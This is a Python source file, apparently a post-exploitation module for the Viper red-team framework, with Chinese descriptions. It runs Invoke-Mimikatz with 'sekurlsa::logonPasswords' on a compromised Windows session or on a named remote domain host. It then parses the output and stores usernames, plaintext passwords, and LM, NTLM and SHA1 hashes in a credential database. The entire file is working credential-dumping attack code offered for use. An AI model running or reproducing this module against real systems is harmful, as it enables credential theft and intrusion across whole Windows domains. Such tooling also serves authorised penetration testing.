# -*- coding: utf-8 -*-
# @File  : SimplePostPowershellModule.py
# @Date  : 2019/1/12
# @Desc  :

#
#
import re

from PostModule.lib.Credential import Credential
from PostModule.lib.Host import Host
from PostModule.lib.ModuleTemplate import PostMSFPowershellFunctionModule, TAG2CH
from PostModule.lib.OptionAndResult import Option, register_options
from PostModule.lib.Session import Session


class PostModule(PostMSFPowershellFunctionModule):
    NAME = "域主机的内存密码信息"
    DESC = "模块收集主机所在域中某个域主机内存中的密码信息.如果没有填写主机名,则抓取本机内存中的密码信息\n" \
           "(需要SYSTEM权限或已通过UAC的Administrator权限,模块执行耗时较长)"
    MODULETYPE = TAG2CH.Credential_Access
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = ["T1003"]  # ATTCK向量
    REFERENCES = ["https://attack.mitre.org/techniques/T1003/"]
    AUTHOR = "Viper"

    OPTIONS = register_options([
        Option(name='ComputerName', name_tag="域主机名", type='str', required=False,
               desc="填写域中某个主机的名称,可通过<收集所有域主机的信息>获取域主机列表", ),
        Option(name='MimikatzCommand', name_tag="Mimikatz命令", type='str', required=True,
               default='privilege::debug sekurlsa::logonPasswords exit',
               desc="抓取密码的Mimikatz命令,建议保持默认值", ),
        Option(name='LargeOutPut', name_tag="缓存结果到文件", type='bool', required=True, desc="如果抓取密码不全或预计脚本有大量输出,请选择此项",
               default=False),

    ])

    def __init__(self, sessionid, hid, custom_param):
        super().__init__(sessionid, hid, custom_param)
        self.set_script("Invoke-Mimikatz.ps1")  # 设置目标机执行的脚本文件

    def check(self):
        """执行前的检查函数"""
        session = Session(self._sessionid)
        if session.is_windows is not True:
            return False, "模块只支持Windows的Meterpreter"
        if session.is_admin is not True:
            return False, "模块需要管理员权限,请尝试提权"

        computerName = self.param('ComputerName')
        mimikatzCommand = self.param('MimikatzCommand')
        largeOutPut = self.param('LargeOutPut')
        self.set_largeoutput(largeOutPut)

        if mimikatzCommand is None:
            mimikatzCommand = 'privilege::debug sekurlsa::logonPasswords exit'

        if computerName is None:
            execute_string = "Invoke-Mimikatz -Command '{}'".format(mimikatzCommand)
        else:
            if session.is_in_domain is not True:
                return False, "如果需要抓取域内远程主机的密码信息,Session必须在域中"
            execute_string = "Invoke-Mimikatz -Command '{}' -ComputerName {}".format(mimikatzCommand,
                                                                                     computerName)
        self.set_execute_string(execute_string)

        return True, None

    @staticmethod
    def search(pattern, data, control):
        patterns = {
            'username': '\s+\*\s+Username\s+:\s+',
            'isusername': '\$\s*$|\(null\)\s*$|\@\s*$',
            'password': '\s+\*\s+Password\s+:\s+',
            'ispassword': '\(null\)\s*$',
            'domain': '\s+\*\s+Domain\s+:\s+',
            'isdomain': '\(null\)\s*$',
            'LM': '\s+\*\s+LM\s+:\s+',
            'isLM': '\(null\)\s*$',
            'NTLM': '\s+\*\s+NTLM\s+:\s+',
            'isNTLM': '\(null\)\s*$',
            'SHA1': '\s+\*\s+SHA1\s+:\s+',
            'isSHA1': '\(null\)\s*$',
        }
        if (re.search(r'{}'.format(patterns[pattern]), data) and not re.search(r'{}'.format(patterns[control]), data)):
            result = re.sub(r'{}'.format(patterns[pattern]), '', data).rstrip()
            if len(
                    result) > 255:  # b4 47 c4 d3 03 5b 58 8a 6e 9d f4 异常处理
                return False
            else:
                return result
        else:
            return False

    def format_dict(self, tmpdict):
        computerName = self.param('ComputerName')
        if computerName is None:
            host_ipaddress = Host.get_ipaddress(self._hid)
        else:
            host_ipaddress = computerName

        if tmpdict.get('Password') is not None:
            result_str = "用户名:{} 域:{} 密码:{}".format(tmpdict.get('Username'), tmpdict.get('Domain'),
                                                    tmpdict.get('Password'))
            self.log_good(result_str)
            tag = {'domain': tmpdict.get('Domain'), 'type': 'Password'}
            Credential.add_credential(username=tmpdict.get('Username'), password=tmpdict.get('Password'),
                                      password_type='windows', tag=tag,
                                      source_module=self.NAME, host_ipaddress=host_ipaddress,
                                      desc='')

        if tmpdict.get('LM') is not None:
            result_str = "用户名:{} 域:{} LM:{}".format(tmpdict.get('Username'), tmpdict.get('Domain'),
                                                    tmpdict.get('LM'))
            self.log_good(result_str)
            tag = {'domain': tmpdict.get('Domain'), 'type': 'LM'}
            Credential.add_credential(username=tmpdict.get('Username'), password=tmpdict.get('LM'),
                                      password_type='windows', tag=tag,
                                      source_module=self.NAME, host_ipaddress=host_ipaddress,
                                      desc='')

        if tmpdict.get('NTLM') is not None:
            result_str = "用户名:{} 域:{} NTLM:{}".format(tmpdict.get('Username'), tmpdict.get('Domain'),
                                                      tmpdict.get('NTLM'))
            self.log_good(result_str)
            tag = {'domain': tmpdict.get('Domain'), 'type': 'NTLM'}
            Credential.add_credential(username=tmpdict.get('Username'), password=tmpdict.get('NTLM'),
                                      password_type='windows', tag=tag,
                                      source_module=self.NAME, host_ipaddress=host_ipaddress,
                                      desc='')

        if tmpdict.get('SHA1') is not None:
            result_str = "用户名:{} 域:{} SHA1:{}".format(tmpdict.get('Username'), tmpdict.get('Domain'),
                                                      tmpdict.get('SHA1'))
            self.log_good(result_str)
            tag = {'domain': tmpdict.get('Domain'), 'type': 'SHA1'}
            Credential.add_credential(username=tmpdict.get('Username'), password=tmpdict.get('SHA1'),
                                      password_type='windows', tag=tag,
                                      source_module=self.NAME, host_ipaddress=host_ipaddress,
                                      desc='')

    def callback(self, status, message, data):

        if status:
            output = data.replace('\x00', '')
            self.log_status("获取密码列表")
            tmpdict = {'Username': None, 'Domain': None, 'Password': None, 'LM': None, 'NTLM': None, 'SHA1': None}
            for line in output.split('\n'):
                username = self.search('username', line, 'isusername')
                if username:
                    if tmpdict.get('Username') is not None:
                        self.format_dict(tmpdict)
                        tmpdict = {'Username': username, 'Domain': None, 'Password': None, 'LM': None, 'NTLM': None,
                                   'SHA1': None}
                    else:
                        tmpdict['Username'] = username
                domain = self.search('domain', line, 'isdomain')
                if domain:
                    tmpdict['Domain'] = domain
                password = self.search('password', line, 'ispassword')
                if password:
                    tmpdict['Password'] = password

                LM = self.search('LM', line, 'isLM')
                if LM:
                    tmpdict['LM'] = LM
                NTLM = self.search('NTLM', line, 'isNTLM')
                if NTLM:
                    tmpdict['NTLM'] = NTLM
                SHA1 = self.search('SHA1', line, 'isSHA1')
                if SHA1:
                    tmpdict['SHA1'] = SHA1
        else:
            self.log_error("模块执行失败")
            self.log_error(message)
